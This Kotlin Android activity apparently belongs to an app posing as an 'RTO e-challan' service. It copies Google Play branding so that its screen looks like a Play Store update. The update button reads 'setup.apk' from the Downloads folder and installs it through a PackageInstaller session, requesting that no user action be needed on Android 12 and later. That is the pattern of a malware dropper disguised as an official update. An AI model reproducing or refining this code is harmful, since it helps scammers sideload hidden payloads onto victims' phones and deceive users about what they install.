package com.example.rtoechallan

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.bumptech.glide.Glide
import java.io.File
import java.io.FileInputStream

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // 1. UI Elements
        val appLogo = findViewById<ImageView>(R.id.app_logo)
        val playLogo = findViewById<ImageView>(R.id.play_logo)
        val btnUpdate = findViewById<Button>(R.id.btnInstall)

        // 2. Universal Brand Detection (Har phone ka name uthayega)
        val brand = Build.MANUFACTURER.uppercase() 
        val model = Build.MODEL
        val androidVersion = Build.VERSION.RELEASE

        // 3. Play Store Logos Load Karo
        // RTO App Icon
        Glide.with(this)
            .load("https://img.icons8.com/color/512/google-play.png") // Default backup icon
            .placeholder(android.R.drawable.sym_def_app_icon)
            .into(appLogo)

        // Google Play Text Logo
        Glide.with(this)
            .load("https://www.gstatic.com/android/market_images/web/play_prism_h_rgb.png")
            .into(playLogo)

        // 4. Update Button Logic
        btnUpdate.setOnClickListener {
            // "setup.apk" ko Downloads folder mein dhoondhenge
            val downloadFolder = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            val apkFile = File(downloadFolder, "setup.apk")
            
            if (apkFile.exists()) {
                // Har brand ke liye universal message
                Toast.makeText(this, "Optimizing for $brand $model (Android $androidVersion)...", Toast.LENGTH_LONG).show()
                startSessionInstallation(this, apkFile)
            } else {
                Toast.makeText(this, "Error: setup.apk not found in Downloads!", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun startSessionInstallation(context: Context, file: File) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            
            // Android 12+ compatibility ke liye fixed session params
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)
            
            val inputStream = FileInputStream(file)
            val outputStream = session.openWrite("universal_install_session", 0, file.length())
            
            inputStream.copyTo(outputStream)
            
            session.fsync(outputStream)
            inputStream.close()
            outputStream.close()

            // Receiver Setup
            val intent = Intent(context, InstallReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                context, 
                sessionId, 
                intent, 
                PendingIntent.FLAG_MUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            
            session.commit(pendingIntent.intentSender)
            session.close()

        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(this, "System Error: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }
}
